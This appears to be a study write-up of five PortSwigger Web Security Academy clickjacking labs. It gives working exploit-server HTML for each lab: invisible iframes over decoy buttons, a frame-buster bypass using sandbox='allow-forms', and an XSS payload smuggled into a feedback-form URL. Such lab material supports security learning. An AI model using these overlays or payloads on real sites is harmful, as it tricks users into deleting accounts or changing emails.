# Clickjacking (UI redressing)

Get details at [here](https://portswigger.net/web-security/clickjacking)

---

[Lab 1](https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected)

Description of this lab: login functionality and a delete account button that is protected by a CSRF token. A user will click on elements that display the word "click" on a decoy website.

We will exploit at my-account page, use this script for exploit server body:

```html
    <html>
        <head>
        <style>
        #target_website {
            position:relative;
            width: 512px;
            height: 512px;
            opacity:0.00001;
            z-index:2;
            }
        #decoy_btn {
            position:absolute;
            top:490px;
            width:148px;
            height: 32px;
            left: 25px;
            z-index:1;
            }
        </style>
    </head>
    <body>
        <button id="decoy_btn">
            click me
        </button>
        <iframe id="target_website" src="https://0a9e00b803f9b564c403699e003600a9.web-security-academy.net/my-account">
        </iframe>
    </body>
    </html>
```

Clicking store then deliver to victim button, and solved the lab.

[Lab 2](https://portswigger.net/web-security/clickjacking/lab-prefilled-form-input)

Description of this lab: craft some HTML that frames the account page and fools the user into updating their email address by clicking on a "Click me" decoy. The lab is solved when the email address is changed, change the email address of the user by prepopulating a form using a URL parameter and enticing the user to inadvertently click on an "Update email" button.

Using this script for body part of exploit server, deliver to victim for solving the lab. 

```html
    <html>
        <head>
            <style>
                #target_website {
                    position:relative;
                    width: 512px;
                    height: 512px;
                    opacity:0.00001;
                    z-index:2;
                }

                #decoy_btn {
                    position:absolute;
                    top:443px;
                    width:133px;
                    height: 32px;
                    left: 40px;
                    z-index:1;
                }
            </style>
        </head>

        <body>
            <button id="decoy_btn">
                click me
            </button>
            <iframe id="target_website" src="https://0adc002b04cbf2d9c0464d1400b70014.web-security-academy.net/my-account?email=test@example.com">
            </iframe>
        </body>
    </html>
```
[Lab 3](https://portswigger.net/web-security/clickjacking/lab-frame-buster-script)

Description of this lab: craft some HTML that frames the account page and fools the user into updating their email address by clicking on a "Click me" decoy. The lab is solved when the email address is changed, get around the frame buster and conduct a clickjacking attack that changes the users email address

Using `sandbox="allow-forms"` in script for body part of exploit server for frame buster, deliver to victim for solving the lab. 

```html
    <html>
        <head>
            <style>
                #target_website {
                    position:relative;
                    width: 512px;
                    height: 512px;
                    opacity:0.00001;
                    z-index:2;
                }
                #decoy_btn {
                    position:absolute;
                    top:443px;
                    width:133px;
                    height: 32px;
                    left: 40px;
                    z-index:1;
                }
            </style>
        </head>

        <body>
            <button id="decoy_btn">
                click me
            </button>
            <iframe sandbox="allow-forms" id="target_website" src="https://0abc007403c75832c048cd1d00620031.web-security-academy.net/my-account?email=target@website.com">
            </iframe>
        </body>
    </html>

```

[Lab 4](https://portswigger.net/web-security/clickjacking/lab-exploiting-to-trigger-dom-based-xss)

Description of this lab: XSS vulnerability that is triggered by a click. Construct a clickjacking attack that fools the user into clicking the "Click me" button to call the print() function.

We can find the vulnerability in feedback form where users can type anything. Use this script in exploit server and do it like previous lab, then solved the lab.

```html
    <html>
    <head>
        <style>
        #target_website {
            position:relative;
            width: 512px;
            height: 1024px;
            opacity:0.10001;
            z-index:2;
            }
        #decoy_btn {
            position:absolute;
            top:798px;
            width:158px;
            height: 32px;
            left: 27px;
            z-index:1;
            }
        </style>
    </head>
    <body>
        <button id="decoy_btn">
        click
        </button>
        <iframe id="target_website" src="https://0aeb002903c405aac09ef522001600ab.web-security-academy.net/feedback?name=%3Cimg%20src=x%20onerror=%22print()%22/%3E&email=target@website.com&subject=blabla&message=blabla">
        </iframe>
    </body>
    </html>
```

[Lab 5](https://portswigger.net/web-security/clickjacking/lab-multistep)

Description of this lab: solve this lab construct an attack that fools the user into clicking the delete account button and the confirmation dialog by clicking on "Click me first" and "Click me next" decoy actions. This lab is protected by a CSRF token and also has a confirmation dialog to protect against Clickjacking

Bypass its protection with 2 buttons, using this script for body part of exploit server, deliver to victim for solving the lab. 

```html
    <html>
        <head>
            <style>
                #target_website {
                    position:relative;
                    width: 512px;
                    height: 512px;
                    opacity:0.10001;
                    z-index:2;
                    }
                #first_decoy_btn {
                    position:absolute;
                    top:490px;
                    width:148px;
                    height: 32px;
                    left: 25px;
                    z-index:1;
                    }
                #second_decoy_btn {
                    position:absolute;
                    top:288px;
                    width:120px;
                    height: 32px;
                    left: 193px;
                    z-index:1;
                    }
            </style>
        </head>

        <body>
            <button id="first_decoy_btn">
                Click me first
            </button>
            <button id="second_decoy_btn">
                Click me next
            </button>
            <iframe id="target_website" src="https://0a6e00b704a9bb4ec04e21e0005000b7.web-security-academy.net/my-account">
            </iframe>
        </body>
    </html>
```
